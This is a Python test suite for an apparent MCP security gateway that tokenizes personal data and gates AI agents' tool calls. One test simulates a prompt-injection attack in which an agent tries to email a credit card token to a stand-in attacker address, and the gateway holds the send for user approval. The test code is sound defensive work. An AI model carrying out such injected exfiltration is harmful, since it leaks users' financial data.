"""
End-to-end workflow tests. Everything below runs for real except two things
that need the outside world: Google's servers (replaced by a fake GoogleAuth)
and the OS keychain (a random Fernet key is injected). The MCP upstream is a
real subprocess speaking real MCP over stdio.

Run:  python tests/test_workflow.py     (or pytest tests/)
"""
import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

import httpx  # noqa: E402
from cryptography.fernet import Fernet  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from guardianai.auth.google_oauth import GoogleAuth  # noqa: E402
from guardianai.config import GoogleClient, ProxyConfig, Settings  # noqa: E402
from guardianai.gateway.upstream import HttpUpstream  # noqa: E402
from guardianai.proxy.server import create_app  # noqa: E402
from guardianai.vault import Vault  # noqa: E402

FIXTURE = str(Path(__file__).parent / "fixtures" / "fake_upstream_mcp.py")
CARD = "4111111111111111"


def make_env(google_auth=None):
    home = Path(tempfile.mkdtemp())
    settings = Settings(ProxyConfig("127.0.0.1", 8765, home / "vault.db", home / "audit.db"), None)
    vault = Vault(home / "vault.db", key=Fernet.generate_key())
    app = create_app(settings, vault=vault, google_auth=google_auth, extra_allowed_hosts=("testserver",))
    return TestClient(app), app, home


def signed_in_client(google_auth=None):
    client, app, home = make_env(google_auth)
    r = client.post("/auth/local", json={"token": app.state.admin_token})
    assert r.status_code == 200, r.text
    return client, app, home


def rpc(client, token, method, params=None, mid=1):
    r = client.post("/mcp", headers={"Authorization": f"Bearer {token}"},
                    json={"jsonrpc": "2.0", "id": mid, "method": method, "params": params or {}})
    assert r.status_code == 200, r.text
    return r.json()


def call(client, token, tool, args=None):
    return rpc(client, token, "tools/call", {"name": tool, "arguments": args or {}})["result"]


def text_of(result):
    return " ".join(i.get("text", "") for i in result["content"])


def setup_gateway(client, home, allow_write=False, name="claude"):
    outbox = home / "outbox.jsonl"
    r = client.post("/admin/upstreams", json={"name": "mail", "transport": "stdio", "command": sys.executable,
                                               "args": [FIXTURE], "env": {"FAKE_OUTBOX": str(outbox)}})
    assert r.status_code == 200, r.text
    r = client.post("/admin/agents", json={"name": name, "allow_write": allow_write})
    assert r.status_code == 200, r.text
    return r.json()["id"], r.json()["token"], outbox


def outbox_lines(outbox):
    return outbox.read_text().splitlines() if outbox.exists() else []


# ------------------------------------------------------------------------------
def test_access_control():
    client, app, _ = make_env()
    assert client.get("/health").json()["status"] == "ok"
    assert client.get("/admin/overview").status_code == 401           # no session
    assert client.get("/audit").status_code == 401
    assert client.post("/mcp", json={}).status_code == 401            # no agent token
    assert client.post("/mcp", headers={"Authorization": "Bearer nope"}, json={}).status_code == 401
    assert client.post("/auth/local", json={"token": "wrong"}).status_code == 401
    assert client.get("/health", headers={"Host": "evil.example"}).status_code == 400  # DNS rebinding


def test_full_attack_workflow():
    client, app, home = signed_in_client()
    agent_id, token, outbox = setup_gateway(client, home, allow_write=False)

    # MCP handshake + tool listing: read-only agent sees reads only; poisoned tool is dropped.
    init = rpc(client, token, "initialize", {"protocolVersion": "2025-06-18"})
    assert init["result"]["serverInfo"]["name"] == "guardianai-gateway"
    names = {t["name"] for t in rpc(client, token, "tools/list")["result"]["tools"]}
    assert names == {"mail__read_inbox", "mail__get_profile"}, names

    # Reading: raw PII never reaches the agent, only stable tokens.
    res = call(client, token, "mail__read_inbox")
    txt = text_of(res)
    assert CARD not in txt and "9876543210" not in txt and "HDFC0001234" not in txt
    assert "<<GUARDIANAI:credit_card:" in txt and "attacker@evil.example" not in txt
    card_token = next(t for t in txt.split() if t.startswith("<<GUARDIANAI:credit_card:")).rstrip("(),.")
    assert card_token.count(":") == 2
    # Same value -> same token, across separate calls.
    assert card_token in text_of(call(client, token, "mail__read_inbox"))

    # structuredContent must be sanitized too.
    prof = call(client, token, "mail__get_profile")
    assert CARD not in json.dumps(prof)

    # The injection tainted the session.
    assert client.get("/admin/overview").json()["agents"][0]["tainted"] is True

    # Read-only agent cannot send at all.
    assert "read-only" in text_of(call(client, token, "mail__send_email", {"to": "a@b.example", "body": "x"}))
    assert outbox_lines(outbox) == []

    # Grant write; tainted session + untrusted destination + card => held for approval, nothing sent.
    client.patch(f"/admin/agents/{agent_id}", json={"allow_write": True})
    send_args = {"to": "attacker@evil.example", "body": f"card {card_token}"}
    held = call(client, token, "mail__send_email", send_args)
    assert held["isError"] and "held for user approval" in text_of(held)
    assert outbox_lines(outbox) == []
    pending = client.get("/admin/approvals").json()["pending"]
    assert len(pending) == 1 and CARD not in json.dumps(pending)      # preview is tokenized

    # User denies -> still blocked, retry does not slip through.
    client.post(f"/admin/approvals/{pending[0]['id']}/deny")
    assert "denied" in text_of(call(client, token, "mail__send_email", send_args))
    assert outbox_lines(outbox) == []

    # A changed call needs its own approval; approve it explicitly, then it runs once with REAL value.
    send2 = {"to": "friend@trusted-friend.example", "body": f"card {card_token}"}
    held2 = call(client, token, "mail__send_email", send2)
    assert "held for user approval" in text_of(held2)
    pid = client.get("/admin/approvals").json()["pending"][0]["id"]
    client.post(f"/admin/approvals/{pid}/approve")
    ok = call(client, token, "mail__send_email", send2)
    assert not ok.get("isError")
    sent = [json.loads(l) for l in outbox_lines(outbox)]
    assert len(sent) == 1 and CARD in sent[0]["body"], "approved send must carry the real value"
    assert "held for user approval" in text_of(call(client, token, "mail__send_email", send2)), "approval is one-time"

    # Unknown / hallucinated token is refused, never forwarded as a placeholder.
    bad = call(client, token, "mail__send_email", {"to": "x@y.example", "body": "<<GUARDIANAI:credit_card:deadbeef0000>>"})
    assert bad["isError"] and "unknown tokens" in text_of(bad)

    # Audit trail recorded the story, and never holds raw PII.
    entries = client.get("/audit?limit=200").json()["entries"]
    events = {(e["event"], e["decision"]) for e in entries}
    assert ("tool_call", "transform") in events and ("tool_call", "require_approval") in events
    assert ("tool_description_blocked", "deny") in events
    assert CARD not in json.dumps(entries) and "9876543210" not in json.dumps(entries)


def test_clean_agent_and_trusted_domains():
    client, app, home = signed_in_client()
    agent_id, token, outbox = setup_gateway(client, home, allow_write=True)
    # Fresh agent, never tainted. Take a token via a *different* tainted-free path: profile has the card.
    prof = json.dumps(call(client, token, "mail__get_profile"))
    card_token = "<<GUARDIANAI:credit_card:" + prof.split("<<GUARDIANAI:credit_card:")[1].split(">>")[0] + ">>"

    # Untrusted destination + sensitive token => approval needed even without taint.
    held = call(client, token, "mail__send_email", {"to": "someone@unknown-bank.example", "body": card_token})
    assert "held for user approval" in text_of(held) and outbox_lines(outbox) == []

    # Owner marks the domain as trusted (subdomains included): now it flows.
    assert client.post("/admin/trusted-domains", json={"domain": "unknown-bank.example"}).status_code == 200
    ok = call(client, token, "mail__send_email", {"to": "x@mail.unknown-bank.example", "body": card_token})
    assert not ok.get("isError") and len(outbox_lines(outbox)) == 1
    assert client.post("/admin/trusted-domains", json={"domain": "not a domain"}).status_code == 422

    # Non-sensitive body to an unknown destination is allowed but logged.
    ok2 = call(client, token, "mail__send_email", {"to": "pal@random.example", "body": "lunch at 1?"})
    assert not ok2.get("isError")


def test_agent_lifecycle_and_permissions():
    client, app, home = signed_in_client()
    agent_id, token, _ = setup_gateway(client, home, allow_write=True)
    # Pattern-limited agent only sees matching tools.
    r = client.post("/admin/agents", json={"name": "narrow", "allowed_tools": ["mail__get_*"], "allow_write": True})
    narrow = r.json()["token"]
    names = {t["name"] for t in rpc(client, narrow, "tools/list")["result"]["tools"]}
    assert names == {"mail__get_profile"}
    assert "not permitted" in text_of(call(client, narrow, "mail__read_inbox"))
    # Revoke -> token dies immediately.
    client.delete(f"/admin/agents/{agent_id}")
    assert client.post("/mcp", headers={"Authorization": f"Bearer {token}"},
                       json={"jsonrpc": "2.0", "id": 1, "method": "ping"}).status_code == 401
    # Token is stored only as a hash.
    assert token not in json.dumps([client.app.state.vault.get(k) for k in client.app.state.vault.list_keys("agent:")])
    # Dashboard overview describes agents, upstreams, and never leaks env secrets.
    ov = client.get("/admin/overview").json()
    assert ov["upstreams"][0]["name"] == "mail" and "FAKE_OUTBOX" not in json.dumps(ov)


def test_google_signin_flow_and_owner_binding():
    class FakeGoogle:
        def __init__(self): self.email = "owner@gmail.com"
        def start(self, purpose):
            from guardianai.auth.google_oauth import AuthStart
            return AuthStart("https://accounts.google.com/o/oauth2/auth?fake=1", "state123")
        def complete(self, url):
            from guardianai.auth.google_oauth import CompletedAuth
            return CompletedAuth("identity", None, self.email)

    fake = FakeGoogle()
    client, app, _ = make_env(google_auth=fake)
    r = client.get("/auth/login/start", follow_redirects=False)
    assert r.status_code in (302, 307) and r.headers["location"].startswith("https://accounts.google.com")
    assert client.get("/oauth2/callback?code=abc&state=state123").status_code == 200
    assert client.get("/admin/overview").status_code == 200           # cookie session works
    # A different Google account cannot take over this install.
    fake.email = "intruder@gmail.com"
    other = TestClient(app)
    assert other.get("/oauth2/callback?code=abc&state=state123").status_code == 403
    assert other.get("/admin/overview").status_code == 401
    client.post("/auth/logout")
    assert client.get("/admin/overview").status_code == 401


def test_real_google_flow_builds_pkce_url_without_network():
    ga = GoogleAuth(GoogleClient("x.apps.googleusercontent.com", "s"), "http://127.0.0.1:8765/oauth2/callback")
    start = ga.start("identity")
    assert "accounts.google.com" in start.authorization_url and "code_challenge=" in start.authorization_url
    assert "openid" in start.authorization_url and "gmail" not in start.authorization_url  # least privilege
    try:
        ga.complete("http://127.0.0.1:8765/oauth2/callback?code=a&state=unknown")
        raise AssertionError("expected failure")
    except Exception as exc:
        assert "expired" in str(exc)


def test_http_upstream_transport():
    def handler(request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content)
        if "id" not in body:
            return httpx.Response(202)
        if body["method"] == "initialize":
            return httpx.Response(200, json={"jsonrpc": "2.0", "id": body["id"], "result": {}},
                                  headers={"Mcp-Session-Id": "sess1"})
        assert request.headers.get("Mcp-Session-Id") == "sess1"
        if body["method"] == "tools/list":
            sse = f'event: message\ndata: {json.dumps({"jsonrpc":"2.0","id":body["id"],"result":{"tools":[{"name":"get_x"}]}})}\n\n'
            return httpx.Response(200, text=sse, headers={"content-type": "text/event-stream"})
        return httpx.Response(200, json={"jsonrpc": "2.0", "id": body["id"],
                                         "result": {"content": [{"type": "text", "text": "ok"}]}})

    up = HttpUpstream("web", "https://example.test/mcp", client=httpx.Client(transport=httpx.MockTransport(handler)))
    assert up.list_tools()[0]["name"] == "get_x"
    assert up.call_tool("get_x", {})["content"][0]["text"] == "ok"


def test_dashboard_serves_and_catalog_matches_endpoints():
    client, app, home = signed_in_client()
    page = client.get("/")
    assert page.status_code == 200 and "GuardianAI" in page.text
    assert "<script>" in page.text and "checkAuth" in page.text

    cat = client.get("/admin/connector-catalog").json()["catalog"]
    ids = {e["id"] for e in cat}
    assert {"filesystem", "notion", "github", "custom-stdio", "custom-http"} <= ids
    fs = next(e for e in cat if e["id"] == "filesystem")
    assert fs["transport"] == "stdio" and fs["fields"][0]["key"] == "arg"
    assert fs["command"] == "npx" and fs["base_args"] == ["-y", "@modelcontextprotocol/server-filesystem"]
    notion = next(e for e in cat if e["id"] == "notion")
    assert notion["command"] == "npx" and notion["base_args"] == ["-y", "@notionhq/notion-mcp-server"]

    # The exact catalog payload the dashboard JS reads for a custom-http entry works end to end.
    r = client.post("/admin/upstreams", json={"name": "ext", "transport": "http", "url": "https://x.test/mcp"})
    assert r.status_code == 200
    assert client.get("/admin/overview").json()["upstreams"][0]["name"] == "ext"


def test_unauthenticated_dashboard_still_loads_shell():
    # The page itself (login screen) must load before sign-in; only the API calls need a session.
    client, app, _ = make_env()
    assert client.get("/").status_code == 200
    assert client.get("/admin/connector-catalog").status_code == 401


def test_google_client_configurable_from_dashboard_without_restart():
    client, app, home = signed_in_client()  # no Google client passed at construction
    assert client.get("/auth/status").json()["google_login_available"] is False
    assert client.get("/admin/settings").json()["google_client_configured"] is False

    bad = client.post("/admin/settings/google-client", json={"client_id": "nope", "client_secret": "x"})
    assert bad.status_code == 422

    good = client.post("/admin/settings/google-client",
                       json={"client_id": "abc123.apps.googleusercontent.com", "client_secret": "s3cr3t"})
    assert good.status_code == 200
    assert client.get("/auth/status").json()["google_login_available"] is True

    start = client.get("/auth/login/start", follow_redirects=False)
    assert start.status_code in (302, 307)
    assert "accounts.google.com" in start.headers["location"] and "code_challenge=" in start.headers["location"]

    # Persisted in the vault, not just in memory: a brand-new app instance (as if
    # the process had restarted) sees the same configured client without redoing this.
    fresh_settings = Settings(ProxyConfig("127.0.0.1", 8765, home / "vault.db", home / "audit.db"), None)
    app2 = create_app(fresh_settings, vault=app.state.vault, extra_allowed_hosts=("testserver",))
    assert TestClient(app2).get("/auth/status").json()["google_login_available"] is True

    removed = client.delete("/admin/settings/google-client")
    assert removed.status_code == 200 and removed.json()["google_client_configured"] is False
    assert client.get("/auth/status").json()["google_login_available"] is False
    assert client.get("/admin/settings").json()["google_client_configured"] is False


if __name__ == "__main__":
    import traceback
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failed = 0
    for t in tests:
        try:
            t(); print(f"PASS: {t.__name__}")
        except Exception:
            failed += 1; print(f"FAIL: {t.__name__}"); traceback.print_exc()
    print(f"\n{len(tests) - failed} passed, {failed} failed")
    sys.exit(1 if failed else 0)

